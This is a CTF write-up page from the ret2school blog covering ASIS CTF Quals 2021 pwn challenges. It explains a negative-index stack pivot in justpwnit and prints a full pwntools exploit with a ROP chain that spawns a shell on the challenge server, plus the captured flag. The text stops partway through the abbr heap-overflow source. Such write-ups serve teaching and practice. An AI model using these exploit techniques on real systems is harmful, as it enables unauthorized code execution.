@@ -1,0 +1,663 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-8K5XT0SJN8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit"/>
+<meta name="twitter:description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.
+justpwnit justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec&rsquo;s output:
+[*] &#39;/home/nasm/justpwnit&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !"/>
+
+    <meta property="og:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit" />
+<meta property="og:description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.
+justpwnit justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec&rsquo;s output:
+[*] &#39;/home/nasm/justpwnit&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/pwnasis/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-10-24T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-10-24T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 24, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          13 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
+You can find the related files <a href="https://github.com/ret2school/ctf/blob/master/2021/asisctf">here</a>.</p>
+<h1 id="justpwnit">justpwnit</h1>
+<p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
+The binary is statically linked and here is the checksec&rsquo;s output:</p>
+<pre><code>[*] '/home/nasm/justpwnit'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
+Here it is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">/*
+</span><span style="color:#6272a4"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
+</span><span style="color:#6272a4"> */</span>
+<span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">#define STR_SIZE 0x80
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">set_element</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>parray) {
+  <span style="color:#8be9fd">int</span> index;
+  printf(<span style="color:#f1fa8c">&#34;Index: &#34;</span>);
+  <span style="color:#ff79c6">if</span> (scanf(<span style="color:#f1fa8c">&#34;%d%*c&#34;</span>, <span style="color:#ff79c6">&amp;</span>index) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span>)
+    exit(<span style="color:#bd93f9">1</span>);
+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>(parray[index] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)calloc(<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">char</span>), STR_SIZE)))
+    exit(<span style="color:#bd93f9">1</span>);
+  printf(<span style="color:#f1fa8c">&#34;Data: &#34;</span>);
+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>fgets(parray[index], STR_SIZE, stdin))
+    exit(<span style="color:#bd93f9">1</span>);
+}
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">justpwnit</span>() {
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>array[<span style="color:#bd93f9">4</span>];
+  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">4</span>; i<span style="color:#ff79c6">++</span>) {
+    set_element(array);
+  }
+}
+
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+  setvbuf(stdin, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+  setvbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+  alarm(<span style="color:#bd93f9">180</span>);
+  justpwnit();
+  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
+Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
+<p>Let&rsquo;s see this in gdb !</p>
+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
+01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
+02:0010│         0x7ffef03864f0 ◂— 0x0
+03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
+04:0020│         0x7ffef0386500 ◂— 0x0
+05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
+06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
+07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
+08:0040│ rax     0x7ffef0386520 ◂— 0xb4
+09:0048│         0x7ffef0386528 ◂— 0x0
+... ↓            4 skipped
+0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
+0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
+</code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to chich we will write right after with <code>fgets</code>.</p>
+<p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
+01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
+02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
+03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
+04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
+05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
+06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
+07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
+08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
+09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
+... ↓            4 skipped                                                                                                                                                                     
+0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
+0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
+</code></pre><p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
+<h2 id="ropchain">ROPchain</h2>
+<p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
+The binary is statically linked, so we can&rsquo;t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
+<p>And so what we need is:</p>
+<ul>
+<li>pop rdi gadget</li>
+<li>pop rsi gadget</li>
+<li>pop rdx gadget</li>
+<li>pop rax gadget</li>
+<li>syscall gadget</li>
+<li>mov qword ptr [reg], reg [to write &ldquo;/bin/sh\0&rdquo;] in a writable area</li>
+</ul>
+<p>We can easily find these gadgets with the help (ROPgadget)[https://github.com/JonathanSalwan/ROPgadget].
+We got:</p>
+<pre><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
+0x0000000000401001 : pop rax ; ret
+0x00000000004019a3 : pop rsi ; ret
+0x00000000004013e9 : syscall
+0x0000000000403d23 : pop rdx ; ret
+0x0000000000401b0d : pop rdi ; ret
+</code></pre><p>Now we just have to craft the ropchain !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401b0d</span>
+POP_RDX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000403d23</span>
+SYSCALL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004013e9</span>
+POP_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401001</span>
+POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004019a3</span>
+
+MOV_RSI_PTR_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000406c32</span>
+PT_LOAD_W <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000040c240</span>
+
+pld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(PT_LOAD_W)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_RSI_PTR_RAX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x3b</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(PT_LOAD_W)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(SYSCALL)
+</code></pre></div><p>And we can enjoy the shell !</p>
+<pre><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
+[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 168.119.108.148 on port 11010: Done
+[*] Switching to interactive mode
+$ id
+uid=999(pwn) gid=999(pwn) groups=999(pwn)
+$ ls
+chall
+flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
+$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
+ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
+</code></pre><h2 id="full-exploit">Full exploit</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfinit</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;justpwnit&#39;</span>)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> True
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> False
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">set follow-fork-mode parent
+</span><span style="color:#f1fa8c">b* main
+</span><span style="color:#f1fa8c">continue
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+<span style="color:#6272a4">#===========================================================</span>
+<span style="color:#6272a4">#                    EXPLOIT GOES HERE</span>
+<span style="color:#6272a4">#===========================================================</span>
+
+io <span style="color:#ff79c6">=</span> start()
+io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;-2&#34;</span>)
+
+<span style="color:#6272a4"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span>
+<span style="color:#6272a4"># 0x0000000000401001 : pop rax ; ret</span>
+<span style="color:#6272a4"># 0x00000000004019a3 : pop rsi ; ret</span>
+<span style="color:#6272a4"># 0x00000000004013e9 : syscall</span>
+<span style="color:#6272a4"># 0x0000000000403d23 : pop rdx ; ret</span>
+<span style="color:#6272a4"># 0x0000000000401b0d : pop rdi ; ret</span>
+
+POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401b0d</span>
+POP_RDX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000403d23</span>
+SYSCALL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004013e9</span>
+POP_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401001</span>
+POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004019a3</span>
+
+MOV_RSI_PTR_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000406c32</span>
+
+PT_LOAD_W <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000040c240</span>
+
+pld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(PT_LOAD_W)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_RSI_PTR_RAX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x3b</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(PT_LOAD_W)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDX) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(SYSCALL)
+
+io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Data: &#34;</span>, pld)
+
+io<span style="color:#ff79c6">.</span>interactive()
+</code></pre></div><h1 id="abbr">abbr</h1>
+<p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked).</p>
+<p>Here is the source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;ctype.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&#34;rules.h&#34;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> Translator {
+  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">*</span>translate)(<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>);
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>text;
+  <span style="color:#8be9fd">int</span> size;
+} Translator;
+
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">english_expand</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>text) {
+  <span style="color:#8be9fd">int</span> i, alen, blen;
+  Rule <span style="color:#ff79c6">*</span>r;
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>p, <span style="color:#ff79c6">*</span>q;
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>end <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>text[strlen(text)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]; <span style="color:#6272a4">// pointer to the last character
+</span><span style="color:#6272a4"></span>
+  <span style="color:#6272a4">/* Replace all abbreviations */</span>
+  <span style="color:#ff79c6">for</span> (p <span style="color:#ff79c6">=</span> text; <span style="color:#ff79c6">*</span>p; <span style="color:#ff79c6">++</span>p) {
+    <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#ff79c6">sizeof</span>(rules) <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span>(Rule); i<span style="color:#ff79c6">++</span>) {
+      r <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>rules[i];
+      alen <span style="color:#ff79c6">=</span> strlen(r<span style="color:#ff79c6">-&gt;</span>a);
+      blen <span style="color:#ff79c6">=</span> strlen(r<span style="color:#ff79c6">-&gt;</span>b);
+      <span style="color:#ff79c6">if</span> (strncasecmp(p, r<span style="color:#ff79c6">-&gt;</span>a, alen) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+        <span style="color:#6272a4">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
+</span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">for</span> (q <span style="color:#ff79c6">=</span> end; q <span style="color:#ff79c6">&gt;</span> p; <span style="color:#ff79c6">--</span>q)
+          <span style="color:#ff79c6">*</span>(q<span style="color:#ff79c6">+</span>blen<span style="color:#ff79c6">-</span>alen) <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>q;
+        <span style="color:#6272a4">// Update end
